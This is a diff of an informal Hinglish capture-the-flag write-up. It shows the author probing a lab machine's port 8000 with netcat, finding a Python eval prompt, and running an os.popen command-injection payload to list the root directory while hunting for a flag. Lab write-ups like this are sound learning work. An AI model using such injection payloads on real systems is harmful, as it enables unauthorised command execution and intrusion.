@@ -17,59 +17,98 @@ i cant go on ssh because i have zero information about credentials
 so i browse port 8000 in fire fox browser
 
 # Step 2 http://10.10.121.147:8000/
+
 Try a more basic connection! 
 
 
 TCP ya UDP connection banaana, jisme data end-to-end stream ke form me exchange hota hai — bina kisi extra formatting ke.
 
 # Step 3  Usage of NETCAT for basic connection
+
 nc <target_ip> <port>
 
 (idevyogi㉿kali)-[~]
+
 └─$ nc 10.10.121.147 8000
+
 after this i got my cursor in next line and just blank theen i give hello nomral in it then it respond to me in this way
+
 REASON OF HELLO -
+
 ✅ Agar reply milta hai, to samajh aata hai ki port alive aur responsive hai
+
 hello
+
 name 'hello' is not defined
 
 
 # Step 4 as i know defined error is given in programming python so i try their code
+
 print(1+1)
+
 2
+
 it works so now i will give input of python to retrieve information
 
 # Step 5 i use python code for listed item 
+
 print(__import__('os').popen('ls').read())
 
 this not list file 
 
+
 print(__import__('os').popen('ls /').read())
+
 but this kist me item because from this ls /it give root directories files.
+
 --  root directory listed in this way
+
 bin
+
 boot             # command   kya karti haii      KAB FAIL HO SKTI HAI
+
 dev                  ls        CWD LIST KRNA      Agar inaccessible/empty hO
+
 etc                  ls/       ROOT LIST KARNA     RARELY(ALWAYS ACCESIBLE)
+
 home
+
 lib
+
 lib32
+
 lib64
+
 libx32
+
 lost+found
+
 media
+
 mnt
+
 opt
+
 proc
+
 root
+
 run
+
 sbin
+
 srv
+
 swap.img
+
 sys
+
 tmp
+
 usr
+
 var
+
 # Step 6
 
 In this now i will explore various directories in point of veiw of flag
